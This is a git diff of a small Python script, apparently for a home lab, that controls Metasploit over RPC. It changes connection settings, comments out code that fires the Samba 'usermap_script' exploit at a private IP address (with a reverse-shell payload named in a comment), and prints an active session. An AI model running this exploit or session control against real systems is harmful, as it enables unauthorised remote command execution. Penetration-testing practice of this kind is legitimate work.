@@ -2,7 +2,9 @@ from pymetasploit3.msfrpc import *
 
 
 # client = MsfRpcClient('backindoor')
-client = MsfRpcClient('backindoor', port=55553, ssl=True)
+# client = MsfRpcClient('backindoor', port=55553, ssl=True)
+client = MsfRpcClient('backindoor', port=55552, ssl=False)
+
 
 # client.modules.post
 
@@ -35,22 +37,24 @@ client = MsfRpcClient('backindoor', port=55553, ssl=True)
 # print(module.execute())
 
 # Sesiones activas
-# print(client.sessions.list)
+# keys = list(client.sessions.list.keys())
+# print(keys[0])
+print(client.sessions.list['1'])
 
 
 # print(client.modules.exploits)
-module = client.modules.use('exploit', 'multi/samba/usermap_script')
+# module = client.modules.use('exploit', 'multi/samba/usermap_script')
 # payload = client.modules.use('payload', 'cmd/unix/reverse')
 # print(module.missing_required)
-module['RHOSTS'] = '192.168.1.55'
+# module['RHOSTS'] = '192.168.1.55'
 # module['RPORT'] = '445'
 # print(module.runoptions)
 # print(module.options)
 # print(module.optioninfo)
 # Listar payloads disponibles
-print(module.targetpayloads())
-ss = module.execute()
-print(ss)
+# print(module.targetpayloads())
+# ss = module.execute()
+# print(ss)
 
 
 # Crear consola
